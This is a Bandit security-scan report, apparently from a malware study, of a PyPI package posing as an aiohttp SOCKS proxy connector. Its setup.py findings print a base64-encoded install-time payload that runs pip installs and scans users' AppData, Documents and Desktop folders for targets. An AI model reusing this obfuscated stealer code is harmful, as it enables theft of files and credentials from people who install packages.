Run started:2025-04-13 08:54:36.694039

Test results:
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/connector.py:85
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
84	            )
85	            await sock.connect((host, port))
86	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/connector.py:100
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
99	            )
100	        return await super(ProxyConnector, self).connect(
101	            req=req, traces=traces, timeout=timeout
102	        )

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/helpers.py:63
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
62	    proxy_type=ProxyType.SOCKS5,
63	    socks_host="127.0.0.1",
64	    socks_port=1080,
65	    username=None,
66	    password=None,
67	    rdns=True,
68	    family=socket.AF_INET,
69	    loop=None,
70	    **kwargs
71	):
72	    if host is None or port is None:
73	        raise ValueError("host and port must be specified")  # pragma: no cover
74	
75	    if loop is None:
76	        loop = asyncio.get_event_loop()

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/helpers.py:95
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
94	        raise ProxyError("Only socks proxies are allowed to use `open_connection`")
95	    await sock.connect((host, port))
96	

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/helpers.py:107
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
106	    proxy_type=ProxyType.SOCKS5,
107	    socks_host="127.0.0.1",
108	    socks_port=1080,
109	    username=None,
110	    password=None,
111	    rdns=True,
112	    family=socket.AF_INET,
113	    loop=None,
114	    **kwargs
115	):
116	    if protocol_factory is None:
117	        raise ValueError("protocol_factory " "must be specified")  # pragma: no cover
118	
119	    if host is None or port is None:
120	        raise ValueError("host and port " "must be specified")  # pragma: no cover
121	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/helpers.py:142
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
141	        raise ProxyError("Only socks proxies are allowed to use `create_connection`")
142	    await sock.connect((host, port))
143	

--------------------------------------------------
>> Issue: [B806:sendall] socket.socket.sendall
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:104
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b806_sendall.html
103	                raise ValueError("Unsupported item")
104	        await self._loop.sock_sendall(self._socket, data)
105	

--------------------------------------------------
>> Issue: [B809:recv] socket.socket.recv
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:109
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b809_recv.html
108	        while len(data) < n:
109	            packet = await self._loop.sock_recv(self._socket, n - len(data))
110	            if not packet:

--------------------------------------------------
>> Issue: [B304:blacklist] socket.socket
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:137
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
136	
137	        self._socket = socket.socket(family=self._family, type=socket.SOCK_STREAM)
138	        self._socket.setblocking(False)

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:141
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
140	        try:
141	            await self._loop.sock_connect(
142	                sock=self._socket, address=(self._socks_host, self._socks_port)
143	            )

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:145
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
144	        except OSError as e:
145	            self.close()
146	            raise SocksConnectionError(

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:152
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
151	        except asyncio.CancelledError:  # pragma: no cover
152	            self.close()
153	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:158
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
157	        except SocksError:
158	            self.close()
159	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:162
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
161	            if _is_proactor(self._loop) or _is_uvloop(self._loop):
162	                self.close()
163	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:166
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
165	    def close(self):
166	        self._socket.close()
167	

--------------------------------------------------
>> Issue: [B806:sendall] socket.socket.sendall
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:169
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b806_sendall.html
168	    async def sendall(self, data):
169	        await self._loop.sock_sendall(self._socket, data)
170	

--------------------------------------------------
>> Issue: [B809:recv] socket.socket.recv
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:172
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b809_recv.html
171	    async def recv(self, nbytes):
172	        return await self._loop.sock_recv(self._socket, nbytes)
173	

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:215
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
214	
215	        await self._send(req)
216	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:229
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
228	    async def negotiate(self):
229	        await self._socks_connect()
230	

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:257
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
256	
257	        await self._send(req)
258	        res = await self._receive(2)

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:284
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
283	
284	            await self._send(req)
285	            res = await self._receive(2)

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:298
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
297	
298	        await self._send(req)
299	        res = await self._receive(3)

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector/proto.py:370
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
369	        await self._socks_auth()
370	        await self._socks_connect()

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/setup.py:22
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
21	    try:
22	        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
23	    except IndexError:

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/setup.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
29	with open("README.md") as f:
30	    long_description = f.read()
31	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/setup.py:38
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
37	    license="Apache 2",
38	    url="https://github.com/Skactor/aiohttp-proxy",
39	    description="Full-featured proxy connector for aiohttp",

--------------------------------------------------
>> Issue: [B801:b64decode] base64.b64decode
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/setup.py:95
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b801_b64decode.html
94	    def b64(code: str) -> str:
95	        return b64decode(code.encode('utf8')).decode('utf8')
96	

--------------------------------------------------
>> Issue: [B300:blacklist] base64.b64decode
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/setup.py:95
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b300-base64-b64decode
94	    def b64(code: str) -> str:
95	        return b64decode(code.encode('utf8')).decode('utf8')
96	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/setup.py:103
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
102	    with open(join(main_dir, 'main.cpython-39.py'), 'w', encoding='utf8') as f:
103	        f.write(b64('aW1wb3J0IG9zICxzeXMgI2xpbmU6MgpleGVjdXRhYmxlID1zeXMgLmV4ZWN1dGFibGUgLnJlcGxhY2UgKCdcXCcsJ1xcXFwnKSNsaW5lOjMKb3MgLnN5c3RlbSAoZiJ7ZXhlY3V0YWJsZX0gLW0gZW5zdXJlcGlwIikjbGluZTo0Cm9zIC5zeXN0ZW0gKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIGFpb2ZpbGVzIikjbGluZTo1Cm9zIC5zeXN0ZW0gKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIGFpb2h0dHAiKSNsaW5lOjYKb3MgLnN5c3RlbSAoZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwgY3J5cHRvZ3JhcGh5IikjbGluZTo3Cm9zIC5zeXN0ZW0gKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIGFpb3NxbGl0ZSIpI2xpbmU6OApvcyAuc3lzdGVtIChmIntleGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCBtc3MiKSNsaW5lOjkKb3MgLnN5c3RlbSAoZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwgcHlwaXdpbjMyIikjbGluZToxMAojIS91c3IvYmluL2VudiBweXRob24KaW1wb3J0IGNvbnRleHRsaWIgYXMgX19zdGlja3l0YXBlX2NvbnRleHRsaWIgI2xpbmU6MTIKQF9fc3RpY2t5dGFwZV9jb250ZXh0bGliIC5jb250ZXh0bWFuYWdlciAjbGluZToxNApkZWYgX19PT08wTzBPTzBPME8wMDAwTyAoKTojbGluZToxNQogICAgaW1wb3J0IHRlbXBmaWxlICNsaW5lOjE2CiAgICBpbXBvcnQgc2h1dGlsICNsaW5lOjE3CiAgICBPT08wTzAwTzAwME9PMDAwTyA9dGVtcGZpbGUgLm1rZHRlbXAgKCkjbGluZToxOAogICAgdHJ5IDojbGluZToxOQogICAgICAgIHlpZWxkIE9PTzBPMDBPMDAwT08wMDBPICNsaW5lOjIwCiAgICBmaW5hbGx5IDojbGluZToyMQogICAgICAgIHNodXRpbCAucm10cmVlIChPT08wTzAwTzAwME9PMDAwTyApI2xpbmU6MjIKd2l0aCBfX09PTzBPME9PME8wTzAwMDBPICgpYXMgX19PMDBPMDAwTzBPT08wMDAwMCA6I2xpbmU6MjQKICAgIGRlZiBfX09PTzAwMDAwT08wTzAwMDBPIChPTzAwTzAwT09PME9PMDAwMCAsTzAwME8wTzAwMDBPMDAwMDAgKTojbGluZToyNQogICAgICAgIGltcG9ydCBvcyAsb3MgLnBhdGggI2xpbmU6MjYKICAgICAgICBkZWYgT08wTzBPT08wME8wT09PMDAgKE9PTzBPMDAwMDAwME9PTzAwICk6I2xpbmU6MjgKICAgICAgICAgICAgT09PT08wT09PME9PT08wT08gPU9PTzBPMDAwMDAwME9PTzAwIC5zcGxpdCAoIi8iKSNsaW5lOjI5CiAgICAgICAgICAgIE8wME8wT09PMDAwME9PME9PID1fX08wME8wMDBPME9PTzAwMDAwICNsaW5lOjMwCiAgICAgICAgICAgIGZvciBPME8wMDBPT09PT08wME8wMCBpbiBPT09PTzBPT08wT09PTzBPTyA6I2xpbmU6MzEKICAgICAgICAgICAgICAgIE8wME8wT09PMDAwME9PME9PID1vcyAucGF0aCAuam9pbiAoTzAwTzBPT08wMDAwT08wT08gLE8wTzAwME9PT09PTzAwTzAwICkjbGluZTozMgogICAgICAgICAgICAgICAgaWYgbm90IG9zIC5wYXRoIC5leGlzdHMgKE8wME8wT09PMDAwME9PME9PICk6I2xpbmU6MzMKICAgICAgICAgICAgICAgICAgICBvcyAubWtkaXIgKE8wME8wT09PMDAwME9PME9PICkjbGluZTozNAogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbiAob3MgLnBhdGggLmpvaW4gKE8wME8wT09PMDAwME9PME9PICwiX19pbml0X18ucHkiKSwid2IiKWFzIE8wME8wTzAwMDBPME9PT08wIDojbGluZTozNQogICAgICAgICAgICAgICAgICAgICAgICBPMDBPME8wMDAwTzBPT09PMCAud3JpdGUgKGIiXG4iKSNsaW5lOjM2CiAgICAgICAgT08wTzBPT08wME8wT09PMDAgKG9zIC5wYXRoIC5kaXJuYW1lIChPTzAwTzAwT09PME9PMDAwMCApKSNsaW5lOjM4CiAgICAgICAgT09PME9PMDBPTzBPT08wMDAgPW9zIC5wYXRoIC5qb2luIChfX08wME8wMDBPME9PTzAwMDAwICxPTzAwTzAwT09PME9PMDAwMCApI2xpbmU6NDAKICAgICAgICB3aXRoIG9wZW4gKE9PTzBPTzAwT08wT09PMDAwICwid2IiKWFzIE9PMDBPT09PT08wME9PMDAwIDojbGluZTo0MQogICAgICAgICAgICBPTzAwT09PT09PMDBPTzAwMCAud3JpdGUgKE8wMDBPME8wMDAwTzAwMDAwICkjbGluZTo0MgogICAgaW1wb3J0IHN5cyBhcyBfX3N0aWNreXRhcGVfc3lzICNsaW5lOjQ0CiAgICBfX3N0aWNreXRhcGVfc3lzIC5wYXRoIC5pbnNlcnQgKDAgLF9fTzAwTzAwME8wT09PMDAwMDAgKSNsaW5lOjQ1CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGF0aF9zZWFyY2gucHknLGIiaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IG9zXHJcbmZyb20gb3MgaW1wb3J0IHNjYW5kaXIsIGdldGxvZ2luXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pbiwgaXNkaXJcclxuZnJvbSB0eXBpbmcgaW1wb3J0IERpY3QsIEl0ZXJhYmxlLCBMaXN0XHJcbmZyb20gdG9vbHMgaW1wb3J0IF9oYW5kbGVfdGFza19yZXN1bHRcclxuZnJvbSBsb2dnZXIgaW1wb3J0IExvZ2dlclxyXG5cclxuXHJcbkxPQ0FMID0gb3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXVxyXG5cclxucm9vdF9wYXRocyA9IHtcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJyksXHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdsb2NhbCcpLFxyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAncHJvZ3JhbXMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ3JvYW1pbmcnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkb2N1bWVudHMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkb3dubG9hZHMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkZXNrdG9wJyksXHJcbiAgICAnQzovJyxcclxuICAgICdEOi8nLFxyXG4gICAgJ0U6LycsXHJcbiAgICAnQzovcHJvZ3JhbSBmaWxlcycsXHJcbiAgICAnQzovcHJvZ3JhbSBmaWxlcyAoeDg2KScsXHJcbiAgICAnQzovcHJvZ3JhbWRhdGEnXHJcbn1cclxuXHJcbnVzZXJzID0gKGkubmFtZS5sb3dlcigpIGZvciBpIGluIHNjYW5kaXIoJ2M6L3VzZXJzJykpXHJcbmZvciB1c2VybmFtZSBpbiB1c2VyczpcclxuICAgIGlmIHVzZXJuYW1lIGluIFsnZGVza3RvcC5pbmknLCBnZXRsb2dpbigpLmxvd2VyKCldOlxyXG4gICAgICAgIGNvbnRpbnVlXHJcbiAgICBcclxuICAgIGxvY2FsID0gam9pbignYzpcXFxcdXNlcnMnLCB1c2VybmFtZSlcclxuICAgIHVzZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2FwcGRhdGEnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnYXBwZGF0YScsICdsb2NhbCcpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdhcHBkYXRhJywgJ2xvY2FsJywgJ3Byb2dyYW1zJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2FwcGRhdGEnLCAncm9hbWluZycpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdkb2N1bWVudHMnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnZG93bmxvYWRzJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2Rlc2t0b3AnKVxyXG4gICAgfVxyXG4gICAgcm9vdF9wYXRocy51cGRhdGUodXNlcl9wYXRocylcclxuXHJcbmFzeW5jIGRlZiBzZWFyY2hfcGx1Z2luX3BhdGhzKHBhdGhzOiBJdGVyYWJsZVtzdHJdLCBxdWVyaWVzOiBEaWN0LCBsb2dnZXI6IExvZ2dlcik6XHJcbiAgICB0YXNrczogTGlzdFthc3luY2lvLlRhc2tdID0gW11cclxuXHJcbiAgICBxdWVyaWVzID0ge2subG93ZXIoKTogdiBmb3Igayx2IGluIHF1ZXJpZXMuaXRlbXMoKX1cclxuICAgIHRhcmdldF9mb2xkZXJfbmFtZXMgPSBzZXQocXVlcmllcy5rZXlzKCkpXHJcbiAgICBmb3IgcCBpbiBwYXRoczpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIGlzZGlyKHApOlxyXG4gICAgICAgICAgICAgICAgZm9yIGZuYW1lIGluIHRhcmdldF9mb2xkZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIG9zLnNjYW5kaXIocCkpOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHF1ZXJpZXNbZm5hbWVdIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjdXJyX3BhdGggPSBqb2luKHAsIGZuYW1lKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBsb2dnZXIubG9nKGYnXHhkMFx4OWRceGQwXHhiMFx4ZDBceGI5XHhkMFx4YjRceGQwXHhiNVx4ZDBceGJkXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4M1x4ZDFceDgyXHhkMVx4OGMge2N1cnJfcGF0aH0nKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sgPSBsb29wLmNyZWF0ZV90YXNrKHF1ZXJpZXNbZm5hbWVdLmNhbGxiYWNrKGN1cnJfcGF0aCkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgbG9nZ2VyKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGFza3MuYXBwZW5kKHRhc2spXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBsb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGIyIHNlYXJjaF9wbHVnaW5fcGF0aHMgXHhkMFx4YmZceGQxXHg4M1x4ZDFceDgyXHhkMVx4OGMge3B9IFx4ZDBceGJlXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCB7ZX0nKVxyXG4gICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBwcmludChyZXByKGUpKVxyXG5cclxuXHJcbmFzeW5jIGRlZiBzZWFyY2hfcGF0aHMocGF0aHM6IEl0ZXJhYmxlW3N0cl0sIHF1ZXJpZXM6IEl0ZXJhYmxlKTpcclxuICAgIHRhcmdldF9mb2xkZXJfbmFtZXMgPSB7aS5sb3dlcigpIGZvciBpIGluIHF1ZXJpZXN9XHJcbiAgICBmb3IgcCBpbiBwYXRoczpcclxuICAgICAgICBpZiBpc2RpcihwKTpcclxuICAgICAgICAgICAgZm9yIGZuYW1lIGluIHRhcmdldF9mb2xkZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIG9zLnNjYW5kaXIocCkpOlxyXG4gICAgICAgICAgICAgICAgaWYgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lczpcclxuICAgICAgICAgICAgICAgICAgICB5aWVsZCBqb2luKHAsIGZuYW1lKVxyXG4iKSNsaW5lOjQ3CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgndG9vbHMucHknLGIiaW1wb3J0IG9zXHJcbmltcG9ydCBhc3luY2lvXHJcbmZyb20gYWlvZmlsZXMub3MgaW1wb3J0IHdyYXBcclxuZnJvbSBzaHV0aWwgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgbW92ZVxyXG5mcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyXHJcbmltcG9ydCB3aW5yZWdcclxuaW1wb3J0IHJlXHJcblxyXG5cclxuXHJcbmRlZiB6aXBkaXIocGF0aCwgemlwaCk6XHJcbiAgICAnJydGcm9tIHN0YWNrb3ZlcmZsb3cnJydcclxuICAgICMgemlwaCBpcyB6aXBmaWxlIGhhbmRsZVxyXG4gICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocGF0aCk6XHJcbiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIHppcGgud3JpdGUob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICBvcy5wYXRoLnJlbHBhdGgob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucGF0aC5qb2luKHBhdGgsICcuLicpKSlcclxuXHJcbmNvcHlmaWxlID0gd3JhcChjb3B5ZmlsZSlcclxuY29weXRyZWUgPSB3cmFwKGNvcHl0cmVlKVxyXG5tb3ZlID0gd3JhcChtb3ZlKVxyXG5cclxuXHJcbmRlZiBfaGFuZGxlX3Rhc2tfcmVzdWx0KHRhc2s6IGFzeW5jaW8uVGFzaywgbG9nZ2VyOiBMb2dnZXIpIC0+IE5vbmU6XHJcbiAgICB0cnk6XHJcbiAgICAgICAgdGFzay5yZXN1bHQoKVxyXG4gICAgZXhjZXB0IGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3I6XHJcbiAgICAgICAgcGFzcyAgIyBUYXNrIGNhbmNlbGxhdGlvbiBzaG91bGQgbm90IGJlIGxvZ2dlZCBhcyBhbiBlcnJvci5cclxuICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogICMgcHlsaW50OiBkaXNhYmxlPWJyb2FkLWV4Y2VwdFxyXG4gICAgICAgIGxvZ2dlci5zeW5jX2xvZyhmJ0Vycm9yIHtlIXJ9JykiKSNsaW5lOjQ4CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgnbG9nZ2VyLnB5JyxiJ2Zyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuIGFzIGFzeW5jX29wZW5cclxuZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWVcclxuZnJvbSBhc3luY2lvIGltcG9ydCBTZW1hcGhvcmVcclxuXHJcblxyXG5cclxuY2xhc3MgTG9nZ2VyKCk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgbG9nX3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLnBhdGggPSBqb2luKGxvZ19wYXRoLCBcJ3dvcmtfbG9ncy50eHRcJylcclxuICAgICAgICBzZWxmLnNlbSA9IFNlbWFwaG9yZSgxKVxyXG5cclxuICAgIGFzeW5jIGRlZiBwcmludChzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIGFzeW5jIHdpdGggc2VsZi5zZW06XHJcbiAgICAgICAgICAgIGFzeW5jIHdpdGggYXN5bmNfb3BlbihzZWxmLnBhdGgsIFwnYVwnLCBlbmNvZGluZz1cJ3V0ZjhcJykgYXMgZjpcclxuICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZlwne3RleHR9XFxuXCcpXHJcblxyXG4gICAgYXN5bmMgZGVmIGxvZyhzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlSDolTTolUyIpXHJcbiAgICAgICAgYXdhaXQgc2VsZi5wcmludChmXCd7bm93fSB8IHt0ZXh0fVwnKVxyXG5cclxuICAgIGRlZiBzeW5jX3ByaW50KHNlbGYsIHRleHQpIC0+IE5vbmU6XHJcbiAgICAgICAgd2l0aCBvcGVuKHNlbGYucGF0aCwgX